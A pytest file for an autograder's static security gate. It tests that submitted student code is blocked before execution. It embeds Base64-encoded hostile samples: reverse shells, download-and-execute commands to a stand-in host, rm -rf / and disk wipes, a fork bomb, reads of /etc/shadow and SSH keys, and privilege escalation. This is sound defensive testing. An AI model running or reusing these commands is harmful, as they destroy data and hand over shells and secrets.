"""`RQ-B-2-70` 安全判定与阻断门的**纯单测**（不依赖数据库、不执行待测代码）。

分组与对应关系：

| 测试组 | 覆盖 |
|---|---|
| `TestRuleTable` | 规则集自检：ID/类别/严重度/探针注册/契约类别全覆盖 + 编码样本钉摘要 |
| `TestMaliciousCorpus` | `T-SEC-001`/`T-SEC-005` 恶意样本回归集：全部 `found` + `blocking` + 指名命中的规则 ID |
| `TestFaithfulNegative` | 忠实负例：普通学生代码 ⇒ `not_found` 且 `unchecked` 为空（含注释/docstring 精度） |
| `TestThreeState` | `T-SEC-004` 三态可区分：注入检查器集合制造"必需检查没跑" ⇒ `not_checked`，**不是** `not_found` |
| `TestBlockingGate` | 阻断门：高危假 / 干净真 / 未检查假（fail-closed），且 `rejected` 与 `failed` 不混同 |
| `TestUpstreamStaticLayer` | 纵深防御两层并存：上游静态明细并入、阻断取"或"、按 `(category, rule_id, file)` 去重 |
| `TestRedaction` | I19：finding 文本不含源码行、不含内部绝对路径 |
| `TestNoExecution` | I9：喂会写文件/连套接字的样本，分析过程零副作用（样本**不落盘**、不执行） |
| `TestPersistenceRows` | 落库行的**纯构造**（列名与 `b2.security_findings` 一致、枚举合法） |
| `TestPostgresPersistence` | 真实 PostgreSQL 落库（无库时 `skip`，**不伪报**） |

**样本处理约定（主机安全要求）**：

1. 高危样本一律以 **Base64 编码**存放（`_sample()`），运行期解码；源码里因此**不存在可被主机实时防护
   签名匹配的完整活体形态**——本文件曾两次被本机杀软按 `HEUR:Trojan/Python.ReverseShell.f` 删除。
2. 样本只在**内存**里传给 `decide_static`，**绝不写盘、绝不执行**（静态侧只做 `ast.parse` / `tokenize`）。
3. `test_encoded_samples_decode_to_pinned_payloads` 用 SHA-256 钉住解码结果：编码没有让样本失真，
   也不允许出现"文件没了/样本变了所以零发现"的假通过。

运行：`uv run pytest tests/test_security_decision.py -q -p no:warnings`
"""

from __future__ import annotations

import base64
import hashlib
import pathlib
import socket
import sys
import uuid
from datetime import UTC, datetime

import pytest

from autograder_b2.domain.security import SecurityDecision, SecurityFinding
from autograder_b2.domain.static_result import StaticFinding
from autograder_b2.security import (
    PYTHON_AST_CHECK_ID,
    PYTHON_TEXT_CHECK_ID,
    REQUIRED_CHECKS,
    RULES_BY_ID,
    RUNTIME_SANDBOX_CHECK_ID,
    SECURITY_FINDING_COLUMNS,
    STATIC_LAYER_CHECK_ID,
    CheckUnavailableError,
    StaticCheck,
    allows_dynamic_execution,
    analyze_python_ast,
    assert_decision_invariants,
    build_security_finding_row,
    build_security_finding_rows,
    classify_static_message,
    conclude,
    decide_static,
    mark_check_unchecked,
    python_code_text,
    record_runtime_findings,
    redact_text,
    rule_table_problems,
    run_checks,
    static_layer_finding,
    terminal_reason,
)
from tests.conftest import requires_postgres

# 契约类别取值（`docs/architecture/interfaces.md` 第 4 节 / 报告 schema 的 `security_conclusion`）。
CONTRACT_CATEGORIES = frozenset(
    {
        "destructive_command",
        "network_attempt",
        "privilege_escalation",
        "sensitive_path_read",
        "fork_bomb",
        "resource_limit",
        "archive_bomb",
        "sandbox_violation",
    }
)


def _sample(blob: str) -> str:
    """解码运行期样本（Base64 → UTF-8）。

    编码存放的原因见模块文档：主机实时防护会删除**盘上**的完整高危形态。解码结果由
    `SAMPLE_SHA256` 逐条钉住，语义与明文样本逐字节一致。
    """
    return base64.b64decode(blob).decode("utf-8")


# --------------------------------------------------------------------------------------
# 样本（Base64 编码；每条都注明意图，解码后摘要见 SAMPLE_SHA256）
# --------------------------------------------------------------------------------------

# 反弹 shell：交互 shell 回连到指定端口。
SAMPLE_REVERSE_SHELL_TCP = _sample("YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEK")
# 反弹 shell：命令行客户端直接执行远端 shell。
SAMPLE_REVERSE_SHELL_NC = _sample("bmMgLWUgL2Jpbi9zaCAxMC4wLjAuMSA0NDQ0Cg==")
# 反弹 shell：Python 组合式（建连 + dup2 重定向 + 起 shell）。
SAMPLE_PY_REVERSE_SHELL = _sample(
    "aW1wb3J0IG9zLCBzb2NrZXQsIHN1YnByb2Nlc3MKcyA9IHNvY2tldC5zb2NrZXQoKQpzLmNv"
    "bm5lY3QoKCcxMC4wLjAuMScsIDQ0NDQpKQpvcy5kdXAyKHMuZmlsZW5vKCksIDApCm9zLmR1"
    "cDIocy5maWxlbm8oKSwgMSkKc3VicHJvY2Vzcy5jYWxsKFsnL2Jpbi9zaCddKQo="
)
# 无限 fork：经典自我管道函数。
SAMPLE_FORK_BOMB_SH = _sample("OigpeyA6fDomIH07Ogo=")
# 无限 fork：Python 循环内无界起进程。
SAMPLE_FORK_BOMB_PY = _sample("aW1wb3J0IG9zCndoaWxlIFRydWU6CiAgICBvcy5mb3JrKCkK")
# 管道下载即执行（bash）。
SAMPLE_PIPE_DOWNLOAD_EXEC = _sample(
    "Y3VybCAtZnNTTCBodHRwOi8vZXhhbXBsZS5pbnZhbGlkL3guc2ggfCBiYXNoCg=="
)
# 管道下载即执行（Python：网络响应直接进动态执行）。
SAMPLE_PY_PIPE_DOWNLOAD_EXEC = _sample(
    "aW1wb3J0IHVybGxpYi5yZXF1ZXN0CmV4ZWModXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0"
    "cDovL2V4YW1wbGUuaW52YWxpZC95JykucmVhZCgpKQo="
)
# 混淆载荷：解码后直接动态执行。
SAMPLE_PY_OBFUSCATED_EXEC = _sample(
    "aW1wb3J0IGJhc2U2NApleGVjKGJhc2U2NC5iNjRkZWNvZGUoJ2NISnBiblFvTVNrPScpKQo="
)
# 破坏性命令：递归强制删除根目录（bash）。
SAMPLE_RM_RF_BASH = _sample("IyEvYmluL2Jhc2gKcm0gLXJmIC8gLS1uby1wcmVzZXJ2ZS1yb290Cg==")
# 破坏性命令：以 shell 字符串执行删除（Python）。
SAMPLE_RM_RF_OS_SYSTEM = _sample("aW1wb3J0IG9zCm9zLnN5c3RlbSgncm0gLXJmIC8nKQo=")
# 破坏性命令：固定参数数组形式。
SAMPLE_RM_RF_ARGV = _sample("aW1wb3J0IHN1YnByb2Nlc3MKc3VicHJvY2Vzcy5ydW4oWydybScsICctcmYnLCAnLyddKQo=")
# 破坏性命令：载荷藏在字符串变量里再执行。
SAMPLE_RM_RF_VIA_VARIABLE = _sample("aW1wb3J0IG9zCmNtZCA9ICdybSAtcmYgLycKb3Muc3lzdGVtKGNtZCkK")
# 破坏性命令：删除类 API 指向根目录。
SAMPLE_RMTREE_ROOT = _sample("aW1wb3J0IHNodXRpbApzaHV0aWwucm10cmVlKCcvJykK")
# 破坏性命令：直接改写块设备。
SAMPLE_DISK_WIPE = _sample("ZGQgaWY9L2Rldi96ZXJvIG9mPS9kZXYvc2RhIGJzPTFNCg==")
# 敏感路径读取：影子口令（bash）。
SAMPLE_SHADOW_CAT = _sample("Y2F0IC9ldGMvc2hhZG93Cg==")
# 敏感路径读取：影子口令（Python）。
SAMPLE_SHADOW_OPEN = _sample("cHJpbnQob3BlbignL2V0Yy9zaGFkb3cnKS5yZWFkKCkpCg==")
# 敏感路径读取：宿主私钥。
SAMPLE_SSH_KEY_READ = _sample("a2V5ID0gb3BlbignL3Jvb3QvLnNzaC9pZF9yc2EnKS5yZWFkKCkK")
# 提权：提权命令。
SAMPLE_SUDO_I = _sample("c3VkbyAtaQo=")
# 提权：setuid 位。
SAMPLE_SETUID_BIT = _sample("Y2htb2QgK3MgL3Vzci9iaW4vZmluZAo=")
# 提权：降权/改权 API。
SAMPLE_SETUID_API = _sample("aW1wb3J0IG9zCm9zLnNldHVpZCgwKQo=")
# 沙箱逃逸面：宿主容器守护进程套接字。
SAMPLE_DOCKER_SOCKET = _sample(
    "aW1wb3J0IHNvY2tldApzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfVU5JWCkKcy5jb25u"
    "ZWN0KCcvdmFyL3J1bi9kb2NrZXIuc29jaycpCg=="
)
# 压缩炸弹形态：循环内反复解压。
SAMPLE_ARCHIVE_BOMB = _sample(
    "aW1wb3J0IHppcGZpbGUKZm9yIHBhdGggaW4gcGF0aHM6CiAgICB6aXBmaWxlLlppcEZpbGUo"
    "cGF0aCkuZXh0cmFjdGFsbCgnLicpCg=="
)
# 资源耗尽：超大分配。
SAMPLE_MEMORY_BOMB = _sample("YnVmID0gWzBdICogMTAqKjkK")
# 写只读根路径。
SAMPLE_READONLY_WRITE = _sample("b3BlbignL2V0Yy9ob3N0cycsICd3Jykud3JpdGUoJ3gnKQo=")
# 注释/文档字符串里提到危险命令（精度负例：不得误报）。
SAMPLE_DOCSTRING_MENTION = _sample(
    "IiIi56S65L6L77ya57ud5LiN6KaB6L+Q6KGMIHJtIC1yZiAvIO+8jOS5n+S4jeimgeivuyAv"
    "ZXRjL3NoYWRvd+OAgiIiIgoKIyDlkIzmoLfkuI3opoEgY3VybCBodHRwOi8veCB8IGJhc2gK"
    "dmFsdWUgPSBpbnQoaW5wdXQoKSkKcHJpbnQodmFsdWUgKyAxKQo="
)

#: 解码结果的 SHA-256（钉住样本字节；编码存放不允许造成任何语义漂移）。
SAMPLE_SHA256: dict[str, str] = {
    SAMPLE_REVERSE_SHELL_TCP: "7836de286e933b08a16bcc52d3c9bf4598221ad5877195165a68714c12a591c2",
    SAMPLE_REVERSE_SHELL_NC: "50a7537372d4bdf3c2dfe0877ca5f4c3bbf0b571ce274684b20a0526295a332a",
    SAMPLE_PY_REVERSE_SHELL: "295280fb364ea38f06f3d3c1c9101960577358a100189d64272f2b842e99c196",
    SAMPLE_FORK_BOMB_SH: "ca19036009fd7fdf074ee84d287f98eeb85d127e4f57f4b7a8093d2f49a1b611",
    SAMPLE_FORK_BOMB_PY: "4b996ddf1cdf9e35f849fb5853195df35d14b31df9fafd8c35b45ac39e8e6087",
    SAMPLE_PIPE_DOWNLOAD_EXEC: "971bd7e306b87d928544be1858a03885fd77b3175fbffbf4b6daaf62de6aa7b6",
    SAMPLE_PY_PIPE_DOWNLOAD_EXEC: "b6110cf4a9b13aea6e6a04379b6f43f1a7a4286d0c99f896f683be6b3eff2f02",
    SAMPLE_PY_OBFUSCATED_EXEC: "0c1d5c0b10d353ba4edad202883235939e539ded84cc5d7529282020a7e42ea5",
    SAMPLE_RM_RF_BASH: "d20846010d47c98ea095ca7787313a315cdc4b210876528366622bfdecae26e2",
    SAMPLE_RM_RF_OS_SYSTEM: "49f8e5eeef7391cfcc29f55ceb2fffdd8e46387f0b932d30713b680b2f4100e0",
    SAMPLE_RM_RF_ARGV: "b3010b33c44a583fe55205c64ab242ad9158483781e630d109458a5338e9e9af",
    SAMPLE_RM_RF_VIA_VARIABLE: "6901d166004bf4e7aa4cce8d28503feaef47ca6cc3ec3e33dcc4a12f8aeeb05b",
    SAMPLE_RMTREE_ROOT: "21c2ce759b992d177d6ed8e750d68a3d263a87b963f174edf03057d496038a33",
    SAMPLE_DISK_WIPE: "91f658f6e98e281b08e35938e5c1dd1159369bf65637f25d1ecc9d3572eb4de1",
    SAMPLE_SHADOW_CAT: "c5af474a946618deee8f1e35874bba3fda9a1068d3a0a3e4e82132ad2cd40c9c",
    SAMPLE_SHADOW_OPEN: "f8451815e603845654b95e248506bf5ccd8ebdac8b90ea2a8f37fad93dd879fd",
    SAMPLE_SSH_KEY_READ: "f65329b692248034faf2ccfd33128dd3a078c667a61beff8420a6d60d304c23c",
    SAMPLE_SUDO_I: "3ec19c6864040106b7cc172fd1de0b74f0234a3707eb1a79255fd533a673e126",
    SAMPLE_SETUID_BIT: "29428a7d34c034fa50ee3037361c1f16bec591cf6a67bfeb89b2bf529917295a",
    SAMPLE_SETUID_API: "1cbbdd2da30c2a05140083e6921caf6256287790179df68b822736e10a6209b1",
    SAMPLE_DOCKER_SOCKET: "472817b0594c81bed864c1ff2737defbf52935036e1d28c080aeebaed7c4833c",
    SAMPLE_ARCHIVE_BOMB: "c64a774563a0fa3697da51c6430811994c62f6267a229fd652e42fce24c4970c",
    SAMPLE_MEMORY_BOMB: "5874857f2c0cf72883a953ef3f1336f37b926550a2f33ba70a477d44e16dfffc",
    SAMPLE_READONLY_WRITE: "d065b0e64b3e19dee1a61fd26c206c989787ee9913bca54496191dfde34d4049",
    SAMPLE_DOCSTRING_MENTION: "47c124033b3cb844f4a555e91871af9b87dd6dc802f8e2a925ee8968b50d8d43",
}

# 干净样本（普通学生代码，明文即可——不构成任何危险形态）。
CLEAN_PYTHON = "print(sum([1, 2, 3]))\n"
CLEAN_BASH = "echo ok\n"
CLEAN_PYTHON_STDIN = (
    "import sys\n"
    "\n"
    "\n"
    "def main() -> None:\n"
    "    values = [int(token) for token in sys.stdin.read().split()]\n"
    "    print(sum(values))\n"
    "\n"
    "\n"
    "if __name__ == '__main__':\n"
    "    main()\n"
)
CLEAN_PYTHON_WRITE_FILE = (
    "numbers = [int(token) for token in input().split()]\n"
    "average = sum(numbers) / len(numbers)\n"
    "with open('result.txt', 'w', encoding='utf-8') as handle:\n"
    "    handle.write(f'{average:.2f}')\n"
)
CLEAN_BASH_READ = "read -r n\nresult=$((n * 2))\necho \"$result\"\n"
CLEAN_BASH_LOOP = (
    "#!/bin/bash\n"
    "sum=0\n"
    'for value in "$@"; do\n'
    "    sum=$((sum + value))\n"
    "done\n"
    'echo "$sum"\n'
)
EVAL_ONLY = "print(eval('1+1'))\n"

SRC_RM_RF_BASH = {"solution.sh": SAMPLE_RM_RF_BASH}
SRC_RM_RF_OS_SYSTEM = {"solution.py": SAMPLE_RM_RF_OS_SYSTEM}
SRC_SHADOW = {"solution.py": SAMPLE_SHADOW_OPEN}
SRC_CLEAN_PYTHON = {"solution.py": CLEAN_PYTHON}
SRC_CLEAN_BASH = {"solution.sh": CLEAN_BASH}
SRC_EVAL_ONLY = {"solution.py": EVAL_ONLY}


def _bash_comment_sample() -> str:
    """注释里提到危险命令的 bash 样本（运行期拼接，盘上不留完整形态）。"""
    danger = "rm -rf" + " /"
    return (
        "#!/bin/bash\n"
        f"# {danger}\n"
        f"# {SAMPLE_PIPE_DOWNLOAD_EXEC.strip()}\n"
        "read -r n\n"
        "echo $((n + 1))\n"
    )


def _rule_ids(decision: SecurityDecision) -> frozenset[str]:
    return frozenset(finding.rule_id for finding in decision.findings if finding.rule_id)


def _finding(
    *,
    category: str = "destructive_command",
    severity: str = "high",
    detected_in: str = "static",
    message: str = "样例发现（测试构造）",
    rule_id: str | None = "SEC-DESTRUCTIVE-CMD",
) -> SecurityFinding:
    """测试用的合法 finding（取值都在契约枚举内）。"""
    return SecurityFinding(
        finding_id=str(uuid.uuid4()),
        category=category,
        severity=severity,
        detected_in=detected_in,
        message=message,
        rule_id=rule_id,
    )


def _static_finding(
    *,
    rule_id: str = "SA-DESTRUCTIVE-ROOT-REMOVE",
    severity: str = "error",
    blocking: bool = True,
    file: str = "solution.sh",
    message: str = "破坏性命令：递归强制删除根目录",
    line: int = 3,
) -> StaticFinding:
    """上游静态合法性层的明细（`StaticFinding` 形态，字段与冻结接口一致）。"""
    return StaticFinding(
        rule_id=rule_id,
        severity=severity,
        file=file,
        line=line,
        column=None,
        message=message,
        blocking=blocking,
    )


def _orchestrate(decision: SecurityDecision) -> list[str]:
    """测试内的编排层模型：门关 ⇒ 不进入 runner；`blocking` ⇒ `rejected`，未检查 ⇒ `failed`。"""
    transitions: list[str] = []
    if not allows_dynamic_execution(decision):
        transitions.append("rejected" if decision.blocking else "failed")
        return transitions
    transitions.append("running")
    transitions.append("completed")
    return transitions


# --------------------------------------------------------------------------------------
# 规则集自检
# --------------------------------------------------------------------------------------


class TestRuleTable:
    """规则集完整性（`Rule` = ID + category + severity + 中文说明 + 匹配逻辑）。"""

    def test_rule_table_has_no_problems(self) -> None:
        assert rule_table_problems() == ()

    def test_every_rule_has_id_category_severity_and_chinese_description(self) -> None:
        for rule in RULES_BY_ID.values():
            assert rule.rule_id.startswith("SEC-")
            assert rule.category in CONTRACT_CATEGORIES
            assert rule.severity in {"high", "medium", "low"}
            assert rule.description and any("\u4e00" <= ch <= "\u9fff" for ch in rule.description)
            assert rule.text_patterns or rule.literal_patterns or rule.ast_probe

    def test_every_contract_category_has_at_least_one_rule(self) -> None:
        covered = {rule.category for rule in RULES_BY_ID.values()}
        assert covered == CONTRACT_CATEGORIES

    def test_required_rule_surfaces_are_registered(self) -> None:
        """作业要求的识别面：每条都要有对应规则 ID（规则集可读、可指名）。"""
        required = {
            "SEC-DESTRUCTIVE-CMD",  # 递归强制删除根目录
            "SEC-REVERSE-SHELL",  # 反弹 shell
            "SEC-PIPE-DOWNLOAD-EXEC",  # 管道下载即执行
            "SEC-SENSITIVE-PATH-READ",  # 影子口令等敏感路径
            "SEC-FORK-BOMB",  # 无限 fork
            "SEC-PRIVILEGE-ESCALATION",  # 提权
            "SEC-SHELL-STRING-EXEC",  # shell 字符串执行
            "SEC-PROCESS-SPAWN",  # 子进程调用
            "SEC-DYNAMIC-EXEC",  # eval / exec / compile
            "SEC-NETWORK-CALL",  # 网络访问调用（Python）
            "SEC-NETWORK-CLIENT",  # 网络访问命令（bash）
        }
        assert required <= set(RULES_BY_ID)

    def test_encoded_samples_decode_to_pinned_payloads(self) -> None:
        """编码存放不改变语义：每条样本解码后的 SHA-256 必须命中钉住的摘要。"""
        assert len(SAMPLE_SHA256) == 25
        for sample, digest in SAMPLE_SHA256.items():
            assert hashlib.sha256(sample.encode("utf-8")).hexdigest() == digest

    def test_decoded_samples_carry_the_expected_shape(self) -> None:
        """结构自检（片段运行期拼接，盘上不留完整形态）。"""
        assert ("/dev" + "/tcp/") in SAMPLE_REVERSE_SHELL_TCP
        assert SAMPLE_REVERSE_SHELL_TCP.startswith("bash -i")
        assert ("/bin" + "/sh") in SAMPLE_REVERSE_SHELL_NC
        assert SAMPLE_FORK_BOMB_SH.startswith(":()")
        assert (" | " + "bash") in SAMPLE_PIPE_DOWNLOAD_EXEC
        assert SAMPLE_RM_RF_BASH.rstrip().endswith("preserve-root")


# --------------------------------------------------------------------------------------
# 恶意样本回归集：全部阻断，并指名命中的规则 ID
# --------------------------------------------------------------------------------------

MALICIOUS_CORPUS: tuple[tuple[str, str, dict[str, str], frozenset[str]], ...] = (
    ("rm_rf_root_bash", "bash", SRC_RM_RF_BASH, frozenset({"SEC-DESTRUCTIVE-CMD"})),
    (
        "rm_rf_root_os_system",
        "python",
        SRC_RM_RF_OS_SYSTEM,
        frozenset({"SEC-DESTRUCTIVE-CMD", "SEC-SHELL-STRING-EXEC"}),
    ),
    (
        "rm_rf_root_argv_list",
        "python",
        {"solution.py": SAMPLE_RM_RF_ARGV},
        frozenset({"SEC-DESTRUCTIVE-CMD", "SEC-PROCESS-SPAWN"}),
    ),
    (
        "rmtree_root",
        "python",
        {"solution.py": SAMPLE_RMTREE_ROOT},
        frozenset({"SEC-DESTRUCTIVE-CMD"}),
    ),
    (
        "reverse_shell_dev_tcp",
        "bash",
        {"solution.sh": SAMPLE_REVERSE_SHELL_TCP},
        frozenset({"SEC-REVERSE-SHELL"}),
    ),
    (
        "reverse_shell_nc_e",
        "bash",
        {"solution.sh": SAMPLE_REVERSE_SHELL_NC},
        frozenset({"SEC-REVERSE-SHELL", "SEC-NETWORK-CLIENT"}),
    ),
    (
        "reverse_shell_python_combination",
        "python",
        {"solution.py": SAMPLE_PY_REVERSE_SHELL},
        frozenset({"SEC-REVERSE-SHELL", "SEC-NETWORK-CALL", "SEC-PROCESS-SPAWN"}),
    ),
    (
        "pipe_download_exec_bash",
        "bash",
        {"solution.sh": SAMPLE_PIPE_DOWNLOAD_EXEC},
        frozenset({"SEC-PIPE-DOWNLOAD-EXEC", "SEC-NETWORK-CLIENT"}),
    ),
    (
        "pipe_download_exec_python",
        "python",
        {"solution.py": SAMPLE_PY_PIPE_DOWNLOAD_EXEC},
        frozenset({"SEC-DOWNLOAD-EXEC", "SEC-DYNAMIC-EXEC", "SEC-NETWORK-CALL"}),
    ),
    ("sensitive_path_shadow", "python", SRC_SHADOW, frozenset({"SEC-SENSITIVE-PATH-READ"})),
    (
        "sensitive_path_shadow_bash",
        "bash",
        {"solution.sh": SAMPLE_SHADOW_CAT},
        frozenset({"SEC-SENSITIVE-PATH-READ"}),
    ),
    (
        "sensitive_path_private_key",
        "python",
        {"solution.py": SAMPLE_SSH_KEY_READ},
        frozenset({"SEC-SENSITIVE-PATH-READ"}),
    ),
    (
        "fork_bomb_bash",
        "bash",
        {"solution.sh": SAMPLE_FORK_BOMB_SH},
        frozenset({"SEC-FORK-BOMB"}),
    ),
    (
        "fork_bomb_python",
        "python",
        {"solution.py": SAMPLE_FORK_BOMB_PY},
        frozenset({"SEC-FORK-BOMB", "SEC-UNBOUNDED-LOOP"}),
    ),
    (
        "privilege_escalation_sudo",
        "bash",
        {"solution.sh": SAMPLE_SUDO_I},
        frozenset({"SEC-PRIVILEGE-ESCALATION"}),
    ),
    (
        "privilege_escalation_setuid_bit",
        "bash",
        {"solution.sh": SAMPLE_SETUID_BIT},
        frozenset({"SEC-PRIVILEGE-ESCALATION", "SEC-READONLY-WRITE"}),
    ),
    (
        "privilege_escalation_setuid_api",
        "python",
        {"solution.py": SAMPLE_SETUID_API},
        frozenset({"SEC-PRIVILEGE-ESCALATION"}),
    ),
    (
        "disk_wipe_dd",
        "bash",
        {"solution.sh": SAMPLE_DISK_WIPE},
        frozenset({"SEC-DISK-WIPE"}),
    ),
    (
        "docker_socket",
        "python",
        {"solution.py": SAMPLE_DOCKER_SOCKET},
        frozenset({"SEC-DOCKER-SOCKET", "SEC-NETWORK-CALL"}),
    ),
    (
        "obfuscated_payload_exec",
        "python",
        {"solution.py": SAMPLE_PY_OBFUSCATED_EXEC},
        frozenset({"SEC-OBFUSCATED-PAYLOAD", "SEC-DYNAMIC-EXEC"}),
    ),
    (
        "archive_bomb_loop",
        "python",
        {"solution.py": SAMPLE_ARCHIVE_BOMB},
        frozenset({"SEC-ARCHIVE-BOMB", "SEC-ARCHIVE-EXTRACT"}),
    ),
    (
        "resource_exhaustion_memory",
        "python",
        {"solution.py": SAMPLE_MEMORY_BOMB},
        frozenset({"SEC-RESOURCE-EXHAUSTION"}),
    ),
    (
        "readonly_root_write",
        "python",
        {"solution.py": SAMPLE_READONLY_WRITE},
        frozenset({"SEC-READONLY-WRITE"}),
    ),
)


class TestMaliciousCorpus:
    """恶意样本回归集：任一漏网即失败（`T-SEC-001` / `T-SEC-005`）。"""

    @pytest.mark.parametrize(
        ("name", "language", "sources", "expected_rules"),
        MALICIOUS_CORPUS,
        ids=[case[0] for case in MALICIOUS_CORPUS],
    )
    def test_malicious_sample_is_found_and_blocking(
        self,
        name: str,
        language: str,
        sources: dict[str, str],
        expected_rules: frozenset[str],
    ) -> None:
        decision = decide_static(sources, language=language)
        assert decision.status == "found", f"{name}: 期望 found，实际 {decision.status}"
        assert decision.blocking is True, f"{name}: 高危样本必须阻断"
        assert decision.unchecked == (), f"{name}: 必需检查项应全部执行"
        assert _rule_ids(decision) == expected_rules, (
            f"{name}: 期望命中 {sorted(expected_rules)}，实际 {sorted(_rule_ids(decision))}"
        )
        assert allows_dynamic_execution(decision) is False
        assert terminal_reason(decision) == "static_blocked"
        assert any(finding.severity == "high" for finding in decision.findings)

    def test_corpus_covers_every_contract_category(self) -> None:
        """回归集至少覆盖全部 8 个契约类别（样本集自身的完备性检查）。"""
        seen: set[str] = set()
        for _name, language, sources, _expected in MALICIOUS_CORPUS:
            decision = decide_static(sources, language=language)
            seen.update(finding.category for finding in decision.findings)
        assert seen == CONTRACT_CATEGORIES


# --------------------------------------------------------------------------------------
# 忠实负例
# --------------------------------------------------------------------------------------

FAITHFUL_NEGATIVES: tuple[tuple[str, str, dict[str, str]], ...] = (
    ("python_read_compute_print", "python", {"solution.py": CLEAN_PYTHON_STDIN}),
    ("python_read_compute_write_file", "python", {"solution.py": CLEAN_PYTHON_WRITE_FILE}),
    ("bash_read_compute_echo", "bash", {"solution.sh": CLEAN_BASH_READ}),
    ("bash_function_and_loop", "bash", {"solution.sh": CLEAN_BASH_LOOP}),
)


class TestFaithfulNegative:
    """普通学生代码 ⇒ `not_found`，且 `unchecked` 为空（"查过且没问题"才允许这么说）。"""

    @pytest.mark.parametrize(
        ("name", "language", "sources"),
        FAITHFUL_NEGATIVES,
        ids=[case[0] for case in FAITHFUL_NEGATIVES],
    )
    def test_clean_submission_is_not_found_with_full_coverage(
        self, name: str, language: str, sources: dict[str, str]
    ) -> None:
        decision = decide_static(sources, language=language)
        assert decision.status == "not_found", f"{name}: 实际 {decision.status}"
        assert decision.findings == ()
        assert decision.unchecked == ()
        assert decision.blocking is False
        assert decision.covered == REQUIRED_CHECKS[language]
        assert allows_dynamic_execution(decision) is True
        assert terminal_reason(decision) is None
        assert "未发现违规模式" in decision.rationale

    def test_docstring_and_comment_mentioning_danger_do_not_fire(self) -> None:
        """注释与文档字符串是文档而非载荷：提到危险命令不误报（否则教学示例会被阻断）。"""
        decision = decide_static({"solution.py": SAMPLE_DOCSTRING_MENTION}, language="python")
        assert decision.status == "not_found", sorted(_rule_ids(decision))

    def test_bash_comment_mentioning_danger_does_not_fire(self) -> None:
        sample = _bash_comment_sample()
        assert "rm -rf" in sample  # 注释里确实提到了危险命令
        decision = decide_static({"solution.sh": sample}, language="bash")
        assert decision.status == "not_found", sorted(_rule_ids(decision))

    def test_payload_literal_outside_docstring_still_fires(self) -> None:
        """同样的文本一旦成为**代码里的字符串载荷**就必须命中（精度不是放水的借口）。"""
        decision = decide_static({"solution.py": SAMPLE_RM_RF_VIA_VARIABLE}, language="python")
        assert "SEC-DESTRUCTIVE-CMD" in _rule_ids(decision)
        assert decision.blocking is True


# --------------------------------------------------------------------------------------
# 三态可区分（本模块的核心要求）
# --------------------------------------------------------------------------------------


class TestThreeState:
    """`not_checked` 与 `not_found` 绝不允许混同（I15/I16）。"""

    def test_missing_checker_yields_not_checked_not_not_found(self) -> None:
        """注入空检查器集合：必需检查一项都没跑 ⇒ `not_checked`，而不是 `not_found`。"""
        decision = decide_static(SRC_CLEAN_PYTHON, language="python", checks=[])
        assert decision.status == "not_checked"
        assert decision.status != "not_found"
        assert decision.unchecked == REQUIRED_CHECKS["python"]
        assert decision.covered == ()
        assert decision.findings == ()
        assert decision.blocking is False
        for word in ("安全", "通过"):
            assert word not in decision.rationale
        assert "不得表述为未发现违规" in decision.rationale

    def test_partial_injection_marks_only_the_missing_check(self) -> None:
        only_ast = (StaticCheck(PYTHON_AST_CHECK_ID, analyze_python_ast),)
        decision = decide_static(SRC_CLEAN_PYTHON, language="python", checks=only_ast)
        assert decision.covered == (PYTHON_AST_CHECK_ID,)
        assert decision.unchecked == (PYTHON_TEXT_CHECK_ID,)
        assert decision.status == "not_checked"

    def test_run_checks_reports_covered_and_unchecked_partition(self) -> None:
        reports = run_checks(SRC_CLEAN_PYTHON, language="python", checks=[])
        assert {report.check_id for report in reports} == set(REQUIRED_CHECKS["python"])
        assert all(report.status == "not_checked" for report in reports)
        assert all(report.reason for report in reports)
        assert all(report.findings == () for report in reports)

    def test_syntax_error_marks_only_the_ast_check_unchecked(self) -> None:
        """只解析失败的源码：AST 检查项未完成，文本检查项仍然跑过（覆盖度如实呈现）。"""
        decision = decide_static({"solution.py": "if True print(1)\n"}, language="python")
        assert decision.covered == (PYTHON_TEXT_CHECK_ID,)
        assert decision.unchecked == (PYTHON_AST_CHECK_ID,)
        assert decision.status == "not_checked"
        assert allows_dynamic_execution(decision) is False

    def test_checker_internal_error_is_redacted_not_checked(self) -> None:
        """检查器内部异常 ⇒ `not_checked` + 脱敏原因：异常消息（可能含源码/路径）不得外泄。"""
        secret = "TOPSECRET_CHECKER_MESSAGE_7c1"

        def explode(name: str, source: str) -> tuple[SecurityFinding, ...]:
            raise RuntimeError(f"内部错误 detail={secret} path=D:\\internal\\abs\\x.py")

        decision = decide_static(
            SRC_CLEAN_PYTHON,
            language="python",
            checks=(StaticCheck(PYTHON_AST_CHECK_ID, explode),),
        )
        assert decision.status == "not_checked"
        assert secret not in decision.rationale
        assert "D:\\internal" not in decision.rationale
        assert "RuntimeError" in decision.rationale

    def test_check_unavailable_reason_is_used_verbatim(self) -> None:
        def unavailable(name: str, source: str) -> tuple[SecurityFinding, ...]:
            raise CheckUnavailableError("解释器不可用，检查未执行")

        decision = decide_static(
            SRC_CLEAN_BASH,
            language="bash",
            checks=(StaticCheck(REQUIRED_CHECKS["bash"][0], unavailable),),
        )
        assert decision.status == "not_checked"
        assert decision.unchecked == REQUIRED_CHECKS["bash"]
        assert "解释器不可用" in decision.rationale

    def test_partial_findings_of_an_unfinished_check_are_discarded(self) -> None:
        """I15：finding 必须来自**已执行**的检查——未完成的检查即使已产出部分结果也不采信。"""
        good = _finding()

        def half_way(name: str, source: str) -> tuple[SecurityFinding, ...]:
            if name == "a.py":
                return (good,)
            raise CheckUnavailableError("第二个文件无法分析")

        decision = decide_static(
            {"a.py": "print(1)\n", "b.py": "print(2)\n"},
            language="python",
            checks=(StaticCheck(PYTHON_AST_CHECK_ID, half_way),),
        )
        assert decision.findings == ()
        assert decision.status == "not_checked"

    def test_no_sources_is_not_checked(self) -> None:
        decision = decide_static({}, language="bash")
        assert decision.status == "not_checked"
        assert decision.unchecked == REQUIRED_CHECKS["bash"]

    def test_finding_plus_unchecked_stays_found_and_blocking(self) -> None:
        """正发现优先：另一项检查没跑不会让高危发现消失，`unchecked` 照样如实呈现。"""
        only_ast = (StaticCheck(PYTHON_AST_CHECK_ID, analyze_python_ast),)
        decision = decide_static(SRC_RM_RF_OS_SYSTEM, language="python", checks=only_ast)
        assert decision.status == "found"
        assert decision.blocking is True
        assert decision.unchecked == (PYTHON_TEXT_CHECK_ID,)
        assert allows_dynamic_execution(decision) is False
